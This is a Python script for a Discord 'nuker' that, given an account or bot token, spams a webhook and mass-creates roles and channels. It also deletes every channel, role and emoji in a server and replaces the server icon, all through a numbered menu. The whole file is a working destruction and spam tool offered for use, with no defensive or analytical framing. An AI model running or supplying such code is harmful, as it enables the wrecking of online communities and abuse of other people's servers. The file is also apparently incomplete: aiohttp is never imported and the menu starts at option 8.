import asyncio
import random
from utils import DiscordAPI, Logger, generate_random_string

class SingleTokenNuker:
    def __init__(self, token):
        self.api = DiscordAPI(token)
    
    async def webhook_spam(self, webhook_url, message, amount=200):
        Logger.info(f"Starting webhook spam ({amount} messages)")
        payload = {'content': message, 'username': generate_random_string()}
        
        async with aiohttp.ClientSession() as session:
            tasks = []
            for _ in range(amount):
                tasks.append(session.post(webhook_url, json=payload))
            
            results = await asyncio.gather(*tasks)
            success = sum(1 for r in results if r.status == 204 or r.status == 200)
            Logger.success(f"Sent {success} webhook messages")
    
    async def mass_create_roles(self, guild_id, amount=250):
        Logger.info(f"Creating {amount} roles")
        tasks = []
        for i in range(amount):
            role_name = generate_random_string()
            color = random.randint(0, 0xFFFFFF)
            tasks.append(self.api.request('POST', f'https://discord.com/api/v9/guilds/{guild_id}/roles',
                                         json={'name': role_name, 'color': color}))
        
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r[0] == 200)
        Logger.success(f"Created {success} roles")
    
    async def mass_create_channels(self, guild_id, amount=100):
        Logger.info(f"Creating {amount} channels")
        tasks = []
        for i in range(amount):
            channel_name = generate_random_string()
            tasks.append(self.api.request('POST', f'https://discord.com/api/v9/guilds/{guild_id}/channels',
                                         json={'name': channel_name, 'type': 0}))
        
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r[0] == 201)
        Logger.success(f"Created {success} channels")
    
    async def delete_all_channels(self, guild_id):
        Logger.info(f"Deleting all channels in {guild_id}")
        status, channels = await self.api.request('GET', f'https://discord.com/api/v9/guilds/{guild_id}/channels')
        
        if status == 200:
            tasks = []
            for channel in channels:
                tasks.append(self.api.request('DELETE', f'https://discord.com/api/v9/channels/{channel["id"]}'))
            
            await asyncio.gather(*tasks)
            Logger.success("All channels deleted")
    
    async def delete_all_roles(self, guild_id):
        Logger.info(f"Deleting all roles in {guild_id}")
        status, roles = await self.api.request('GET', f'https://discord.com/api/v9/guilds/{guild_id}/roles')
        
        if status == 200:
            tasks = []
            for role in roles:
                if not role['managed'] and role['name'] != '@everyone':
                    tasks.append(self.api.request('DELETE', 
                        f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role["id"]}'))
            
            await asyncio.gather(*tasks)
            Logger.success("All roles deleted")
    
    async def remove_all_emojis(self, guild_id):
        Logger.info(f"Removing all emojis in {guild_id}")
        status, emojis = await self.api.request('GET', f'https://discord.com/api/v9/guilds/{guild_id}/emojis')
        
        if status == 200:
            tasks = []
            for emoji in emojis:
                tasks.append(self.api.request('DELETE', 
                    f'https://discord.com/api/v9/guilds/{guild_id}/emojis/{emoji["id"]}'))
            
            await asyncio.gather(*tasks)
            Logger.success("All emojis removed")
    
    async def change_server_icon(self, guild_id, image_url):
        Logger.info(f"Changing server icon for {guild_id}")
        
        async with aiohttp.ClientSession() as session:
            async with session.get(image_url) as resp:
                if resp.status == 200:
                    image_data = await resp.read()
                    import base64
                    encoded = base64.b64encode(image_data).decode('utf-8')
                    
                    status, _ = await self.api.request('PATCH', f'https://discord.com/api/v9/guilds/{guild_id}',
                                                      json={'icon': f'data:image/png;base64,{encoded}'})
                    
                    if status == 200:
                        Logger.success("Server icon changed")
                    else:
                        Logger.error("Failed to change icon")

async def main():
    token = input("Enter token: ")
    nuker = SingleTokenNuker(token)
    
    print("\n8. Webhook Spam")
    print("9. Mass Create Roles")
    print("10. Mass Create Channels")
    print("11. Delete All Channels")
    print("12. Delete All Roles")
    print("13. Remove All Emojis")
    print("14. Change Server Icon")
    
    choice = input("\nSelect option: ")
    
    if choice == "8":
        webhook = input("Webhook URL: ")
        message = input("Message: ")
        amount = int(input("Amount: "))
        await nuker.webhook_spam(webhook, message, amount)
    
    elif choice == "9":
        guild = input("Guild ID: ")
        amount = int(input("Amount: "))
        await nuker.mass_create_roles(guild, amount)
    
    elif choice == "10":
        guild = input("Guild ID: ")
        amount = int(input("Amount: "))
        await nuker.mass_create_channels(guild, amount)
    
    elif choice == "11":
        guild = input("Guild ID: ")
        await nuker.delete_all_channels(guild)
    
    elif choice == "12":
        guild = input("Guild ID: ")
        await nuker.delete_all_roles(guild)
    
    elif choice == "13":
        guild = input("Guild ID: ")
        await nuker.remove_all_emojis(guild)
    
    elif choice == "14":
        guild = input("Guild ID: ")
        url = input("Image URL: ")
        await nuker.change_server_icon(guild, url)

if __name__ == "__main__":
    asyncio.run(main())
